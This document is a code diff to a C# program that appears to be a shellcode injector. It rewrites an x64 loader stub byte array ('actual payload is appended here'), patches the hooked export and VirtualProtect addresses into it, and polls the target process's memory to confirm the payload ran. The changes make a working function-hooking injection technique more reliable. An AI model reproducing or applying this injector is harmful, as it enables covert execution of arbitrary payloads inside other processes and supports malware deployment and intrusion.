@@ -29,16 +29,15 @@ internal static class Program
 
     private static readonly byte[] ShellcodeLoader =
     {
-        /* 0000 */ 0x58, 0x48, 0x83, 0xE8, 0x0C, 0x50, 0x53, 0x56, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52,
-        /* 0010 */ 0x41, 0x53, 0x5D, 0x48, 0x8B, 0xDD, 0x48, 0xBE, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 
-        /* 0020 */ 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x08, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 
-        /* 0030 */ 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 
-        /* 0040 */ 0x83, 0xC4, 0x28, 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x03, 
-        /* 0050 */ 0xB9, 0xCC, 0xBB, 0xAA, 0x99, 0x89, 0x4B, 0x08, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x08, 
-        /* 0060 */ 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 
-        /* 0070 */ 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 
-        /* 0080 */ 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 
-        /* 0090 */ 0x5A, 0x59, 0x5E, 0x53, 0xC3 // actual payload is appended here
+        /* 0000 */ 0x56, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xBB, 0x44, 0x44, 0x33,
+        /* 0010 */ 0x33, 0x22, 0x22, 0x11, 0x11, 0x48, 0xBE, 0x88, 0x88, 0x77, 0x77, 0x66, 0x66, 0x55, 0x55, 0x48, 
+        /* 0020 */ 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 
+        /* 0030 */ 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 0x28, 0x48, 0xB8, 
+        /* 0040 */ 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 0x09, 0x09, 0x09, 
+        /* 0050 */ 0x89, 0x43, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 
+        /* 0060 */ 0x00, 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 
+        /* 0070 */ 0xC4, 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 
+        /* 0080 */ 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x5E, 0x53, 0xC3 // actual payload is appended here
     };
     
     private static IntPtr GetModuleHandle(string dll)
@@ -56,7 +55,7 @@ internal static class Program
         return IntPtr.Zero;
     }
 
-    private static void GenerateHook(long originalInstructions_0_8, int originalInstructions_8_B, long virtProtAddr)
+    private static void GenerateHook(long originalInstructions_0_8, int originalInstructions_8_B, long hookedFuncAddr, long virtProtAddr)
     {
         // This function generates the following shellcode.
         // The hooked function export is determined by immediately popping the return address and subtracting by 12, size of
@@ -73,9 +72,9 @@ internal static class Program
         // This shellcode loader stub assumes that the injector has left the hooked function RX, so the stub has to call
         // VirtualProtect to change the hooked function to RWX, restore the original bytes, and then change it back to RX
         //
-        // re-assemble:
+        // re-assemble (yes it is shitty but it works with VS):
         //   ml64 /c /nologo stub.asm && dumpbin /rawdata stub.obj > stub.dump
-        //   0x" + ((("  " + (((gc stub.dump -raw) -split "RAW DATA #1")[1] -split "RAW DATA #3")[0].Trim() -split "`n") | % {$_.Substring(12, 48).Trim() -split " "}) -join ", 0x")
+        //   "0x" + ((("  " + (((gc stub.dump -raw) -split "RAW DATA #1")[1] -split "RAW DATA #3")[0].Trim() -split "`n") | % {$_.Substring(12, 48).Trim() -split " "}) -join ", 0x")
 
         /*
         .code
@@ -161,15 +160,20 @@ internal static class Program
 
         using var writer = new BinaryWriter(new MemoryStream(ShellcodeLoader));
 
-        // Write the VirtualProtect address into the shellcode loader stub
-        writer.Seek(0x18, SeekOrigin.Begin);
+        // Patch the hooked function address into the shellcode loader stub
+        writer.Seek(0x0D, SeekOrigin.Begin);
+        writer.Write(hookedFuncAddr);
+        writer.Flush();
+
+        // Patch the VirtualProtect address into the shellcode loader stub
+        writer.Seek(0x17, SeekOrigin.Begin);
         writer.Write(virtProtAddr);
         writer.Flush();
 
-        //Write the original 12 bytes that were in the original export prior to hooking
-        writer.Seek(0x45, SeekOrigin.Begin);
+        // Patch the 12 bytes that were in the original export prior to hooking
+        writer.Seek(0x40, SeekOrigin.Begin);
         writer.Write(originalInstructions_0_8);
-        writer.Seek(0x51, SeekOrigin.Begin);
+        writer.Seek(0x4C, SeekOrigin.Begin);
         writer.Write(originalInstructions_8_B);
         writer.Flush();
     }
@@ -322,7 +326,7 @@ internal static class Program
         // get the original 12 bytes of the to-be-overwritten export function
         var originalBytes_0_8 = Marshal.ReadInt64(exportAddress);
         var originalBytes_8_B = Marshal.ReadInt32(exportAddress + 0x8);
-        GenerateHook(originalBytes_0_8, originalBytes_8_B, (long)virtProtAddr);
+        GenerateHook(originalBytes_0_8, originalBytes_8_B, (long)exportAddress, (long)virtProtAddr);
 
         // overwrite with the new 12 bytes to call the loader stub
         var callOpCode = new byte[] {
@@ -412,7 +416,7 @@ internal static class Program
 
         while (timer.Elapsed.TotalSeconds < timeout)
         {
-            var bytesToRead = 8;
+            var bytesToRead = 12;
             var buf = Marshal.AllocHGlobal(bytesToRead);
             
             ReadVirtualMemory(
@@ -424,9 +428,10 @@ internal static class Program
 
             var temp = new byte[bytesRead];
             Marshal.Copy(buf, temp, 0, bytesToRead);
-            var currentBytes = BitConverter.ToInt64(temp, 0);
+            var currentBytes_0_8 = BitConverter.ToInt64(temp, 0);
+            var currentBytes_8_B = BitConverter.ToInt32(temp, 8);   
 
-            if (originalBytes_0_8 == currentBytes)
+            if (originalBytes_0_8 == currentBytes_0_8 && originalBytes_8_B == currentBytes_8_B)
             {
                 executed = true;
                 break;
